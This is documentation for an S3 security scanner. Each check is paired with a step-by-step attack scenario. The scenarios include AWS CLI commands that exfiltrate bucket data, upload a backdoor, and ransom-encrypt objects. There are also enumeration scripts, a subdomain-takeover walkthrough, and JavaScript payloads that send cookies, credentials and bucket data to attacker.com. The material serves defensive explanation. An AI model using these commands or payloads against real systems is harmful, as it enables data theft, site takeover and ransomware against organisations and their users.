# S3 Security Scanner - Security Checks Documentation

## Overview

The S3 Security Scanner performs comprehensive security assessments of AWS S3 buckets to identify vulnerabilities, misconfigurations, and compliance violations. This document details every security check performed, why each check is critical, and step-by-step exploitation scenarios that these checks prevent.

## Official AWS Documentation

| Topic | AWS Documentation |
|-------|------------------|
| S3 Security Best Practices | [AWS S3 Security](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html) |
| S3 Block Public Access | [Block Public Access](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html) |
| S3 Bucket Policies | [Bucket Policies](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-policies.html) |
| S3 Server-Side Encryption | [Encryption](https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html) |
| S3 Versioning | [Versioning](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html) |
| S3 Access Logging | [Server Access Logging](https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html) |
| S3 Object Lock | [Object Lock](https://docs.aws.amazon.com/AmazonS3/latest/userguide/object-lock.html) |
| S3 Replication | [Replication](https://docs.aws.amazon.com/AmazonS3/latest/userguide/replication.html) |
| S3 Security Hub Controls | [Security Hub S3 Controls](https://docs.aws.amazon.com/securityhub/latest/userguide/s3-controls.html) |

---

## Security Check Categories

###  [Access Control Checks](#access-control-checks)
###  [Encryption & Data Protection](#encryption--data-protection)
###  [Monitoring & Compliance](#monitoring--compliance)
###  [Threat Detection (GuardDuty & Macie)](#threat-detection)
###  [Event Monitoring & Replication](#event-notifications-configuration)
###  [DNS Takeover Prevention](#dns-takeover-prevention)
###  [Information Disclosure via CNAME](#cname-information-disclosure-analysis)
###  [Object-Level Security](#object-level-security)
###  [ISO Compliance Checks](#iso-compliance-checks)

---

## Access Control Checks

### 1. Public Access Block Configuration

**Check Details:**
- **Function:** `check_public_access_block`
- **Description:** Verifies all four S3 public access block settings are enabled
- **Settings Checked:**
  - `BlockPublicAcls`: Prevents new public ACLs and bucket policies
  - `IgnorePublicAcls`: Ignores existing public ACLs
  - `BlockPublicPolicy`: Prevents new public bucket policies
  - `RestrictPublicBuckets`: Restricts public bucket policies and ACLs

**Why This Check is Critical:**
Public Access Block acts as a "safety net" preventing accidental public exposure even when other configurations are misconfigured. It's the primary defense against the most common S3 security vulnerability.

**Attack Vector When Check Fails:**

**Step 1: Reconnaissance**
```bash
# Attacker scans for S3 buckets using common naming patterns
aws s3 ls s3://company-backup --no-sign-request
aws s3 ls s3://company-data --no-sign-request
aws s3 ls s3://company-assets --no-sign-request
```

**Step 2: Permission Enumeration**
```bash
# Check bucket permissions
aws s3api get-bucket-acl --bucket vulnerable-bucket
aws s3api get-bucket-policy --bucket vulnerable-bucket
```

**Step 3: Exploitation**
```bash
# Without public access block, attacker can:
# 1. Make bucket public via ACL
aws s3api put-bucket-acl --bucket vulnerable-bucket \
  --grant-read uri=http://acs.amazonaws.com/groups/global/AllUsers

# 2. Add public bucket policy
aws s3api put-bucket-policy --bucket vulnerable-bucket \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::vulnerable-bucket/*"}]}'

# 3. Upload malicious content
aws s3 cp malware.exe s3://vulnerable-bucket/update.exe
```

**Real-World Impact:**
- **Capital One (2019)**: Exploited misconfigured S3 buckets exposing 100 million customer records
- **Booz Allen Hamilton (2017)**: 60,000 files exposed via public S3 bucket
- **Verizon (2017)**: 14 million customer records exposed through partner's public S3 bucket

---

### 2. Bucket Policy Analysis

**Check Details:**
- **Function:** `check_bucket_policy`
- **Description:** Analyzes bucket policy for public access and SSL enforcement
- **Checks Performed:**
  - Identifies `Principal: "*"` in Allow statements
  - Verifies SSL enforcement via `aws:SecureTransport` condition
  - Detects overly permissive resource patterns

**Why This Check is Critical:**
Bucket policies are the primary access control mechanism. Misconfigured policies can expose data globally or allow insecure connections susceptible to man-in-the-middle attacks.

**Attack Vector When Check Fails:**

**Step 1: Policy Discovery**
```bash
# Attacker retrieves bucket policy
aws s3api get-bucket-policy --bucket target-bucket
```

**Step 2: Policy Analysis**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::target-bucket/*"
    }
  ]
}
```

**Step 3: Data Exfiltration**
```bash
# List all objects
aws s3 ls s3://target-bucket --recursive --no-sign-request

# Download sensitive data
aws s3 sync s3://target-bucket ./stolen-data --no-sign-request

# Upload malicious content
aws s3 cp backdoor.php s3://target-bucket/admin/backdoor.php --no-sign-request
```

**Step 4: Man-in-the-Middle (if no SSL enforcement)**
```bash
# Attacker intercepts HTTP traffic to steal credentials
# Without SSL enforcement, API calls can be intercepted
tcpdump -i eth0 -A port 80 | grep -i "authorization\|aws"
```

---

### 3. Bucket ACL (Access Control List) Analysis

**Check Details:**
- **Function:** `check_bucket_acl`
- **Description:** Examines bucket ACL for public access grants
- **Patterns Detected:**
  - Grants to `AllUsers` (http://acs.amazonaws.com/groups/global/AllUsers)
  - Grants to `AuthenticatedUsers` (http://acs.amazonaws.com/groups/global/AuthenticatedUsers)

**Why This Check is Critical:**
While bucket policies are preferred, ACLs can still create vulnerabilities. They provide granular object-level control but can inadvertently grant broad access.

**Attack Vector When Check Fails:**

**Step 1: ACL Enumeration**
```bash
# Check bucket ACL
aws s3api get-bucket-acl --bucket vulnerable-bucket
```

**Step 2: Exploit Public ACL**
```bash
# If ACL grants public read access
curl -s https://vulnerable-bucket.s3.amazonaws.com/ | grep -o '<Key>[^<]*</Key>'

# Download all publicly accessible objects
for object in $(aws s3 ls s3://vulnerable-bucket --recursive --no-sign-request | awk '{print $4}'); do
  aws s3 cp s3://vulnerable-bucket/$object ./$object --no-sign-request
done
```

**Step 3: Authenticated User Exploitation**
```bash
# If ACL grants access to any authenticated AWS user
# Attacker uses any valid AWS account (even free tier)
aws s3 ls s3://vulnerable-bucket --profile attacker-account
aws s3 sync s3://vulnerable-bucket ./stolen-data --profile attacker-account
```

---

### 4. Wildcard Principal Policy Analysis (CIS S3.2)

**Check Details:**
- **Function:** `check_wildcard_principal`
- **Description:** Detects bucket policies that allow wildcard (*) principals
- **Risk Level:** HIGH (CIS S3.2 control)
- **Pattern Detected:** `"Principal": "*"` or `"Principal": {"AWS": "*"}`

**Why This Check is Critical:**
Wildcard principals grant access to any AWS user, essentially making resources public. This violates the principle of least privilege and can lead to unauthorized access from any AWS account globally.

**Attack Vector When Check Fails:**

**Step 1: Policy Discovery**
```bash
# Discover buckets with wildcard principal policies
aws s3api get-bucket-policy --bucket target-bucket
```

**Example Vulnerable Policy:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::target-bucket/*"
    }
  ]
}
```

**Step 2: Exploitation from Any AWS Account**
```bash
# Any authenticated AWS user can access the bucket
# This includes free-tier accounts, making barriers to entry very low
aws s3 ls s3://target-bucket --profile attacker-aws-account
aws s3 sync s3://target-bucket ./stolen-data --profile attacker-aws-account
```

**Step 3: Privilege Escalation Risk**
```bash
# If wildcard principal allows s3:PutBucketPolicy
# Attacker can modify bucket policy for persistent access
aws s3api put-bucket-policy --bucket target-bucket \
  --policy file://malicious-policy.json --profile attacker-aws-account
```

---

## Encryption & Data Protection

### 5. Server-Side Encryption Configuration

**Check Details:**
- **Function:** `check_encryption`
- **Description:** Verifies default server-side encryption is enabled
- **Encryption Types Supported:**
  - SSE-S3 (Amazon S3 managed keys)
  - SSE-KMS (AWS Key Management Service)
  - SSE-C (Customer-provided keys)

**Why This Check is Critical:**
Encryption at rest protects data from unauthorized access even if underlying storage is compromised. Without encryption, data is stored in plaintext on AWS storage systems.

**Attack Vector When Check Fails:**

**Step 1: Infrastructure Compromise Scenario**
```bash
# In theoretical scenario where attacker gains access to AWS infrastructure
# (This represents the risk, not an actual exploit method)

# Without encryption: Data readable in plaintext
# With encryption: Data unreadable without proper keys
```

**Step 2: Insider Threat Exploitation**
- **Risk:** Malicious AWS employees could theoretically access unencrypted data
- **Protection:** Encryption ensures even privileged access can't read customer data
- **Compliance:** Required by regulations like GDPR, HIPAA, PCI-DSS

**Step 3: Data Breach Amplification**
```bash
# If bucket is compromised AND unencrypted:
# 1. Immediate data exposure
aws s3 sync s3://unencrypted-bucket ./plaintext-data

# 2. Sensitive data extraction
grep -r "SSN\|credit card\|password" ./plaintext-data

# With encryption, stolen data is unreadable without keys
```

**Real-World Impact:**
- **Regulatory Fines:** GDPR fines up to 4% of annual revenue for unencrypted personal data
- **HIPAA Violations:** $50,000+ per exposed patient record
- **PCI-DSS:** Potential loss of card processing privileges

---

### 6. Versioning Configuration

**Check Details:**
- **Function:** `check_versioning`
- **Description:** Verifies versioning and MFA Delete settings
- **Configurations Checked:**
  - Versioning status (Enabled/Suspended/Disabled)
  - MFA Delete requirement for version deletion

**Why This Check is Critical:**
Versioning protects against data loss from ransomware, accidental deletion, and malicious modification. It's essential for data recovery and maintaining audit trails.

**Attack Vector When Check Fails:**

**Step 1: Ransomware Attack**
```bash
# Attacker gains access and encrypts all objects
for object in $(aws s3 ls s3://no-versioning-bucket --recursive | awk '{print $4}'); do
  # Download original
  aws s3 cp s3://no-versioning-bucket/$object ./temp_file
  
  # Encrypt with ransomware
  openssl enc -aes-256-cbc -in ./temp_file -out ./encrypted_file -k "ransomware_key"
  
  # Replace original (permanent loss without versioning)
  aws s3 cp ./encrypted_file s3://no-versioning-bucket/$object
done

# Demand ransom payment
aws s3 cp ransom_note.txt s3://no-versioning-bucket/README_RANSOM.txt
```

**Step 2: Data Destruction Attack**
```bash
# Malicious insider or compromised account
aws s3 rm s3://no-versioning-bucket --recursive

# Without versioning: Permanent data loss
# With versioning: Previous versions remain recoverable
```

**Step 3: Stealth Data Modification**
```bash
# Attacker modifies financial records
aws s3 cp s3://financial-bucket/quarterly-report.xlsx ./report.xlsx

# Modify data (change numbers, hide fraud)
# ... data manipulation ...

# Replace original (no audit trail without versioning)
aws s3 cp ./modified-report.xlsx s3://financial-bucket/quarterly-report.xlsx
```

---

## Monitoring & Compliance

### 7. Server Access Logging

**Check Details:**
- **Function:** `check_logging`
- **Description:** Verifies S3 server access logging configuration
- **Checks Performed:**
  - Logging enabled status
  - Target bucket for log storage
  - Log prefix configuration

**Why This Check is Critical:**
Access logging provides audit trails for security monitoring, compliance requirements, and forensic analysis. Without logs, security incidents go undetected.

**Attack Vector When Check Fails:**

**Step 1: Silent Data Exfiltration**
```bash
# Attacker accesses sensitive data without detection
aws s3 sync s3://unlogged-bucket ./stolen-data

# No audit trail exists to detect:
# - Who accessed the data
# - When it was accessed
# - What specific objects were downloaded
```

**Step 2: Forensic Blindness**
```bash
# After security incident discovery:
# Without logs, investigators cannot determine:
# - Scope of the breach
# - Timeline of unauthorized access
# - Specific data that was compromised
# - Identity of the attacker
```

**Step 3: Privilege Abuse**
```bash
# Malicious insider with legitimate access
# Without logging, the following goes undetected:
aws s3 cp s3://hr-bucket/salary-data.xlsx ./personal-use.xlsx
aws s3 cp s3://customer-bucket/contact-list.csv ./side-business.csv

# No audit trail to prove unauthorized use
```

**Compliance Impact:**
- **SOX:** Requires audit trails for financial data access
- **HIPAA:** Mandates access logging for PHI
- **PCI-DSS:** Requires detailed access logs for cardholder data
- **GDPR:** Requires ability to demonstrate data processing compliance

---

### 8. Lifecycle Rules Configuration

**Check Details:**
- **Function:** `check_lifecycle_rules`
- **Description:** Verifies lifecycle management configuration
- **Checks Performed:**
  - Existence of lifecycle rules
  - Number of active rules
  - Data management policies

**Why This Check is Critical:**
Lifecycle rules manage data retention and deletion, preventing accumulation of unnecessary data that increases attack surface and compliance risks.

**Attack Vector When Check Fails:**

**Step 1: Data Accumulation Over Time**
```bash
# Without lifecycle rules, buckets accumulate:
# - Old backup files containing sensitive data
# - Deprecated application data
# - Test data with production information
# - Temporary files that should be deleted

# Increased attack surface
aws s3 ls s3://unmanaged-bucket --recursive | wc -l
# Returns: 2,847,392 objects (many unnecessary)
```

**Step 2: Sensitive Data Discovery**
```bash
# Attacker searches accumulated data for sensitive information
aws s3 ls s3://unmanaged-bucket --recursive | grep -i "backup\|test\|temp\|old"

# Finds forgotten sensitive files:
# 2019-01-15  customer-database-backup.sql
# 2020-03-22  test-production-data.csv
# 2021-06-30  temp-employee-ssn-list.xlsx
```

**Step 3: Compliance Violations**
- **Data Retention:** Failure to delete data per legal requirements
- **Privacy Laws:** Retaining personal data beyond permitted periods
- **Regulatory Fines:** Violations of data retention policies

---

### 9. Object Lock Configuration

**Check Details:**
- **Function:** `check_object_lock`
- **Description:** Verifies WORM (Write Once, Read Many) capability
- **Configurations Checked:**
  - Object Lock status
  - Retention mode (Governance/Compliance)
  - Default retention periods

**Why This Check is Critical:**
Object Lock provides immutable storage for compliance and security, preventing deletion or modification of critical data like audit logs and financial records.

**Attack Vector When Check Fails:**

**Step 1: Audit Log Tampering**
```bash
# Attacker gains access and deletes security logs
aws s3 rm s3://security-logs/cloudtrail/ --recursive
aws s3 rm s3://security-logs/access-logs/ --recursive

# Without object lock: Evidence destroyed
# With object lock: Logs remain immutable
```

**Step 2: Financial Record Manipulation**
```bash
# Insider threat scenario
# Download financial records
aws s3 cp s3://financial-data/quarterly-earnings.pdf ./earnings.pdf

# Modify data to hide fraud
# ... document manipulation ...

# Replace original (possible without object lock)
aws s3 cp ./modified-earnings.pdf s3://financial-data/quarterly-earnings.pdf

# Delete original versions to hide tampering
aws s3api delete-object --bucket financial-data --key quarterly-earnings.pdf --version-id original-version
```

**Step 3: Compliance Violations**
- **SEC Requirements:** Inability to guarantee financial record integrity
- **FINRA:** Violation of record retention requirements
- **Legal Discovery:** Cannot prove data integrity in legal proceedings

### 10. Event Notifications Configuration

**Check Details:**
- **Function:** `check_event_notifications`
- **Description:** Verifies event notifications are configured for security monitoring
- **Risk Level:** LOW (CIS S3.11 control)
- **Notification Types Checked:**
  - SNS (Simple Notification Service) topics
  - SQS (Simple Queue Service) queues  
  - Lambda function triggers
  - EventBridge integration

**Why This Check is Critical:**
Event notifications enable real-time security monitoring and automated incident response. Without notifications, malicious activities may go undetected for extended periods.

**Attack Vector When Check Fails:**

**Step 1: Silent Data Exfiltration**
```bash
# Attacker accesses bucket without notifications
aws s3 sync s3://target-bucket ./stolen-data --profile compromised-account

# No alerts generated = No detection
# Security team remains unaware of the breach
```

**Step 2: Malicious Object Upload**
```bash
# Attacker uploads malware or backdoors
aws s3 cp malware.exe s3://target-bucket/files/legitimate-looking-file.exe

# Without notifications:
# - No real-time detection
# - Malware may spread before discovery
# - Compliance violations for malware hosting
```

**Step 3: Policy Manipulation**
```bash
# Attacker modifies bucket policy for persistent access
aws s3api put-bucket-policy --bucket target-bucket --policy file://backdoor-policy.json

# Without notifications:
# - Policy changes go unnoticed
# - Persistent backdoor access established
# - Future security reviews may miss subtle policy changes
```

---

### 11. Cross-Region Replication Configuration

**Check Details:**
- **Function:** `check_replication`
- **Description:** Verifies cross-region replication for disaster recovery
- **Risk Level:** MEDIUM (CIS S3.13 control)
- **Configuration Elements:**
  - Replication rules existence
  - Enabled vs disabled rules
  - Destination bucket configuration
  - IAM role permissions

**Why This Check is Critical:**
Cross-region replication provides disaster recovery capabilities and protects against regional outages, natural disasters, and malicious deletion attacks.

**Attack Vector When Check Fails:**

**Step 1: Regional Disaster Scenario**
```bash
# Hypothetical scenario: AWS region experiences outage
# Without replication: Complete data loss
# With replication: Data available in backup region
```

**Step 2: Malicious Mass Deletion**
```bash
# Insider threat or compromised account performs mass deletion
aws s3 rm s3://critical-bucket --recursive

# Without replication:
# - Data permanently lost
# - Business continuity severely impacted
# - Recovery requires expensive data recovery services

# With replication:
# - Data safely stored in another region
# - Quick recovery possible
# - Business operations can continue
```

**Step 3: Ransomware Attack**
```bash
# Attacker encrypts or deletes bucket contents
# Demands ransom for data recovery

# Scenario without replication:
# - Organization must choose between paying ransom or losing data
# - No guarantee attacker will provide decryption
# - Reputational damage and regulatory penalties

# Scenario with replication:
# - Restore from replicated bucket
# - No ransom payment required
# - Minimal business disruption
```

---

## Threat Detection

### 11a. GuardDuty S3 Protection

**Check Details:**
- **Function:** `check_guardduty_s3_protection`
- **Location:** `checks/threat_detection.py`
- **Description:** Verifies AWS GuardDuty S3 protection is enabled for threat detection
- **Risk Level:** MEDIUM

**Why This Check is Critical:**
GuardDuty S3 protection monitors S3 data events (GetObject, PutObject, DeleteObject) and CloudTrail S3 management events to detect:
- Anomalous data access patterns
- Unauthorized access attempts
- Data exfiltration attempts
- Compromised credentials accessing S3

**What Gets Checked:**
- GuardDuty detector status (enabled/disabled)
- S3 protection feature status
- Data source configuration

### 11b. Macie S3 Discovery

**Check Details:**
- **Function:** `check_macie_s3_protection`
- **Location:** `checks/threat_detection.py`
- **Description:** Verifies Amazon Macie is enabled for sensitive data discovery
- **Risk Level:** MEDIUM

**Why This Check is Critical:**
Amazon Macie uses machine learning to automatically discover, classify, and protect sensitive data:
- PII (Personally Identifiable Information)
- PHI (Protected Health Information)
- Financial data (credit cards, bank accounts)
- Credentials and secrets

**What Gets Checked:**
- Macie session status (enabled/disabled)
- S3 bucket discovery configuration
- Classification job status

---

## DNS Takeover Prevention

### 12. Route53 DNS Record Analysis

**Check Details:**
- **Function:** `discover_route53_records`
- **Description:** Scans Route53 hosted zones for S3-pointing records
- **Detects:**
  - DNS records pointing to S3 website endpoints
  - DNS records pointing to S3 direct endpoints
  - Orphaned DNS records with non-existent buckets

**Why This Check is Critical:**
DNS takeover vulnerabilities allow attackers to serve malicious content on legitimate domains, enabling phishing, malware distribution, and reputation damage.

**Attack Vector When Check Fails:**

**Step 1: Subdomain Reconnaissance**
```bash
# Attacker enumerates subdomains using DNS queries
dig +short CNAME blog.company.com
dig +short CNAME api.company.com
dig +short CNAME staging.company.com

# Discovers DNS record: blog.company.com -> old-blog.s3-website-us-east-1.amazonaws.com
```

**Step 2: Bucket Existence Check**
```bash
# Check if target bucket exists (S3 bucket names are globally unique)
aws s3 ls s3://old-blog
# Error: NoSuchBucket - Vulnerability confirmed!

# The bucket doesn't exist anywhere - attacker can claim it
aws s3 mb s3://old-blog --region us-east-1
```

**Step 3: Subdomain Takeover**
```bash
# Create bucket with same name
aws s3 mb s3://old-blog --region us-east-1

# Enable website hosting
aws s3 website s3://old-blog --index-document index.html --error-document error.html

# Upload malicious content
cat > index.html << EOF
<!DOCTYPE html>
<html>
<head><title>Company Blog</title></head>
<body>
  <h1>Welcome to Company Blog</h1>
  <!-- Credential harvesting form -->
  <form action="https://attacker.com/collect" method="post">
    <input type="email" name="email" placeholder="Enter your email">
    <input type="password" name="password" placeholder="Enter your password">
    <button type="submit">Sign In</button>
  </form>
  
  <!-- Malicious JavaScript -->
  <script>
    // Steal cookies, session tokens, etc.
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        url: window.location.href,
        userAgent: navigator.userAgent
      })
    });
  </script>
</body>
</html>
EOF

aws s3 cp index.html s3://old-blog/

# Now blog.company.com serves attacker's content!
```

**Step 4: Phishing Campaign**
```bash
# Use legitimate domain for phishing
# Send emails: "Update your Company account at https://blog.company.com"
# Victims trust the legitimate domain and enter credentials
```

**Real-World Examples:**
- **GitHub (2020)**: Subdomain takeover via S3 buckets
- **Shopify (2019)**: Multiple subdomains taken over via S3
- **Starbucks (2018)**: Subdomain takeover used for cryptocurrency mining

---

### 13. Manual Domain Analysis

**Check Details:**
- **Function:** `check_domain_for_takeover`
- **Description:** Analyzes specific domains for takeover vulnerabilities
- **Process:**
  - Resolves CNAME records
  - Identifies S3 endpoints in DNS targets
  - Verifies bucket existence and ownership

**Why This Check is Critical:**
Manual domain checking allows verification of specific high-value domains and third-party domains that might not be in Route53 but still pose risks.

**Attack Vector When Check Fails:**

**Step 1: CNAME Resolution**
```bash
# Check specific domain
dig CNAME api.company.com

# Response: api.company.com. 300 IN CNAME legacy-api.s3-website-us-west-2.amazonaws.com.
```

**Step 2: Exploitation**
```bash
# Check bucket ownership
aws s3 ls s3://legacy-api
# NoSuchBucket or AccessDenied from different account

# Attempt takeover
aws s3 mb s3://legacy-api --region us-west-2
aws s3 website s3://legacy-api --index-document index.html

# Create malicious API responses
cat > index.html << EOF
{
  "status": "success",
  "data": {
    "user_id": "captured",
    "session_token": "stolen",
    "redirect": "https://attacker.com/capture"
  }
}
EOF

aws s3 cp index.html s3://legacy-api/
```

---

### 14. Subdomain Enumeration

**Check Details:**
- **Function:** `enumerate_subdomains`
- **Description:** Tests common subdomain prefixes for takeover vulnerabilities
- **Wordlist Includes:**
  - Common prefixes: www, app, api, blog, dev, staging
  - Service-specific: admin, portal, dashboard, docs
  - Environment-specific: test, uat, prod, staging

**Why This Check is Critical:**
Many organizations have forgotten subdomains pointing to old S3 buckets. Comprehensive enumeration finds these hidden attack vectors.

**Attack Vector When Check Fails:**

**Step 1: Automated Subdomain Discovery**
```bash
# Test common prefixes
wordlist="www app api blog dev staging test admin portal docs"
for sub in $wordlist; do
  target="$sub.company.com"
  cname=$(dig +short CNAME $target)
  if echo "$cname" | grep -q "s3"; then
    echo "Found S3 subdomain: $target -> $cname"
  fi
done
```

**Step 2: Mass Takeover**
```bash
# Results:
# staging.company.com -> old-staging.s3-website-us-east-1.amazonaws.com
# dev.company.com -> development-bucket.s3.amazonaws.com
# docs.company.com -> documentation-site.s3-website-eu-west-1.amazonaws.com

# Attempt to claim all vulnerable subdomains
for bucket in old-staging development-bucket documentation-site; do
  aws s3 mb s3://$bucket 2>/dev/null && echo "Claimed: $bucket"
done
```

**Step 3: Coordinated Attack**
```bash
# Use multiple subdomains for sophisticated attack
# staging.company.com - Malware distribution
# dev.company.com - Credential harvesting
# docs.company.com - Social engineering platform
```

---

### 15. CNAME Information Disclosure Analysis

**Check Details:**
- **Function:** `_analyze_cname_information_disclosure`
- **Description:** Analyzes CNAME records pointing to S3 endpoints for information disclosure risks
- **Risk Assessment:**
  - Bucket naming patterns revealing sensitive information
  - Predictable structures enabling bucket enumeration
  - Environment and business logic disclosure
  - Organization structure exposure

**Why This Check is Critical:**
CNAME records that point to S3 buckets can inadvertently expose sensitive information about your infrastructure, naming conventions, and business operations. This information enables attackers to perform targeted enumeration attacks and guess additional bucket names.

**Attack Vector When Check Fails:**

**Step 1: DNS Reconnaissance**
```bash
# Attacker discovers CNAME records
dig +short CNAME api.company.com
# Result: company-prod-api-v2.s3-website-us-east-1.amazonaws.com

dig +short CNAME assets.company.com  
# Result: company-staging-assets-backup.s3.amazonaws.com
```

**Step 2: Pattern Analysis**
```bash
# Attacker analyzes exposed bucket names
# Discovers pattern: [org]-[environment]-[function]-[version]
# Examples from DNS records:
# - company-prod-api-v2
# - company-staging-assets-backup
# - company-dev-database-export
```

**Step 3: Bucket Enumeration Attack**
```bash
# Generate bucket name variations based on discovered patterns
environments="prod staging dev test qa demo"
functions="api web app data backup logs secrets config admin"
versions="v1 v2 v3 v4 v5"

for env in $environments; do
  for func in $functions; do
    for ver in $versions; do
      bucket="company-$env-$func-$ver"
      # Test bucket existence
      aws s3 ls s3://$bucket 2>/dev/null && echo "Found: $bucket"
    done
  done
done
```

**Step 4: Discovered Sensitive Buckets**
```bash
# Results from enumeration:
# company-prod-secrets-v1 (CRITICAL - Contains API keys)
# company-staging-database-backup (HIGH - Contains DB dumps)
# company-dev-config-v2 (MEDIUM - Contains configuration files)
# company-test-logs-v3 (LOW - Contains application logs)
```

**Step 5: Data Exfiltration**
```bash
# Access discovered sensitive buckets
aws s3 sync s3://company-prod-secrets-v1 ./secrets/
aws s3 sync s3://company-staging-database-backup ./database/

# Analyze stolen data
cat secrets/api-keys.json
cat database/users.sql
```

**Advanced Attack Scenarios:**

**Scenario 1: Infrastructure Mapping**
```bash
# From exposed bucket names, attacker maps entire infrastructure:
# - Production: company-prod-*
# - Staging: company-staging-*
# - Development: company-dev-*
# 
# Functions discovered:
# - API endpoints: company-*-api-*
# - Database backups: company-*-database-*
# - Configuration: company-*-config-*
# - Logging: company-*-logs-*
```

**Scenario 2: Supply Chain Attack**
```bash
# Attacker identifies deployment buckets
# company-prod-artifacts-v5 (Build artifacts)
# company-staging-deployment-scripts (Deployment automation)
# 
# Compromises build pipeline by:
# 1. Uploading malicious artifacts
# 2. Modifying deployment scripts
# 3. Injecting backdoors into production deployments
```

**Scenario 3: Credential Harvesting**
```bash
# Targets configuration and secrets buckets
# company-prod-secrets-v1 (API keys, database passwords)
# company-staging-config-v2 (Service configurations)
# 
# Extracts:
# - Database connection strings
# - API keys and tokens
# - Service account credentials
# - Third-party integration secrets
```

**Information Disclosure Risk Levels:**

**CRITICAL Risk Indicators:**
- Sensitive keywords: `secret`, `key`, `password`, `credential`, `token`
- Example: `company-prod-secrets-v1`

**HIGH Risk Indicators:**
- Predictable pattern + business function + environment
- Example: `company-prod-api-v2`

**MEDIUM Risk Indicators:**
- Environment + business function disclosure
- Example: `company-staging-assets`

**LOW Risk Indicators:**
- Organizational structure exposure
- Example: `company-public-assets`

**Defense Strategies:**

**1. Non-Descriptive Bucket Names**
```bash
# Instead of: company-prod-api-v2
# Use: 8a7b9c2d-e3f4-g5h6-i7j8-k9l0m1n2o3p4
```

**2. DNS Aliasing**
```bash
# Use CloudFront or ALB with custom domain
# api.company.com -> CloudFront -> Random S3 bucket name
```

**3. Bucket Name Randomization**
```bash
# Generate random bucket names
# api-$(openssl rand -hex 16)
# assets-$(uuidgen | tr '[:upper:]' '[:lower:]')
```

**Real-World Examples:**
- **Uber (2016)**: Exposed internal bucket names revealed infrastructure
- **Verizon (2017)**: Predictable bucket names enabled enumeration attack
- **Accenture (2017)**: Naming patterns exposed multiple sensitive buckets

---

## Object-Level Security

### 16. Cross-Origin Resource Sharing (CORS) Analysis

**Check Details:**
- **Function:** `check_cors`
- **Description:** Examines CORS configuration for security risks
- **Risk Patterns:**
  - Wildcard (*) in AllowedOrigins
  - Overly permissive allowed methods
  - Unrestricted allowed headers

**Why This Check is Critical:**
Permissive CORS allows malicious websites to access S3 resources through users' browsers, leading to data theft and credential harvesting.

**Attack Vector When Check Fails:**

**Step 1: CORS Configuration Discovery**
```bash
# Check CORS configuration
aws s3api get-bucket-cors --bucket vulnerable-bucket

# Finds permissive configuration:
{
  "CORSRules": [
    {
      "AllowedOrigins": ["*"],
      "AllowedMethods": ["GET", "PUT", "POST"],
      "AllowedHeaders": ["*"]
    }
  ]
}
```

**Step 2: Malicious Website Creation**
```html
<!-- Malicious website: https://evil.com/steal.html -->
<!DOCTYPE html>
<html>
<head><title>Free WiFi Login</title></head>
<body>
<script>
// Exploit permissive CORS to steal data
fetch('https://vulnerable-bucket.s3.amazonaws.com/sensitive-data.json')
  .then(response => response.json())
  .then(data => {
    // Send stolen data to attacker
    fetch('https://attacker.com/collect', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    });
  })
  .catch(error => console.log('CORS blocked - secure configuration'));

// Steal user's AWS credentials if available
if (localStorage.getItem('aws-credentials')) {
  fetch('https://attacker.com/aws-creds', {
    method: 'POST',
    body: localStorage.getItem('aws-credentials')
  });
}
</script>
</body>
</html>
```

**Step 3: Social Engineering Attack**
```bash
# Attacker tricks users into visiting malicious site
# Via email: "Click here for free WiFi access"
# Via ads: "Win a free iPad - click here!"
# Via social media: "Funny video - must watch!"

# User visits evil.com, browser executes JavaScript
# JavaScript accesses S3 bucket due to permissive CORS
# User's data stolen without their knowledge
```

---

### 17. Object-Level Security Analysis

**Check Details:**
- **Function:** `check_object_level_security`
- **Description:** Analyzes individual objects for security issues
- **Checks Performed:**
  - Object ACL permissions
  - Sensitive data patterns in object names
  - Public object access detection

**Sensitive Patterns Detected:**
- **SSN:** `\d{3}-\d{2}-\d{4}`
- **Credit Cards:** `\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}`
- **AWS Keys:** `AKIA[0-9A-Z]{16}`
- **Private Keys:** `.*\.(pem|key|pfx|p12|ppk)$`
- **Password Files:** `.*(password|passwd|pwd|secret|credential).*`
- **Database Backups:** `.*\.(sql|dump|bak|backup)$`

**Why This Check is Critical:**
Bucket-level security doesn't protect against object-level misconfigurations. Individual objects can have public permissions or contain exposed sensitive data.

**Attack Vector When Check Fails:**

**Step 1: Object Enumeration with Sensitive Pattern Detection**
```bash
# List all objects and search for sensitive patterns
aws s3 ls s3://target-bucket --recursive | grep -E "(ssn|social|credit|card|password|secret|key|backup)"

# Discovers sensitive files:
# customer-ssn-list-2023.csv
# payment-credit-card-data.xlsx
# database-backup-passwords.sql
# aws-access-keys-production.txt
# server-private-key.pem
```

**Step 2: Object-Level Access Exploitation**
```bash
# Check individual object ACLs
aws s3api get-object-acl --bucket target-bucket --key customer-ssn-list-2023.csv

# Find object with public ACL despite private bucket
{
  "Grants": [
    {
      "Grantee": {
        "URI": "http://acs.amazonaws.com/groups/global/AllUsers",
        "Type": "Group"
      },
      "Permission": "READ"
    }
  ]
}

# Download publicly accessible sensitive object
aws s3 cp s3://target-bucket/customer-ssn-list-2023.csv ./stolen-ssns.csv --no-sign-request
```

**Step 3: Credential Harvesting**
```bash
# Download files containing credentials
aws s3 cp s3://target-bucket/aws-access-keys-production.txt ./keys.txt
aws s3 cp s3://target-bucket/database-backup-passwords.sql ./db-creds.sql

# Extract credentials
grep -E "AKIA[0-9A-Z]{16}" ./keys.txt
grep -E "password.*=.*|pwd.*=.*" ./db-creds.sql

# Use stolen credentials for lateral movement
export AWS_ACCESS_KEY_ID="AKIAXXXXXXXXXXXXXXXX"
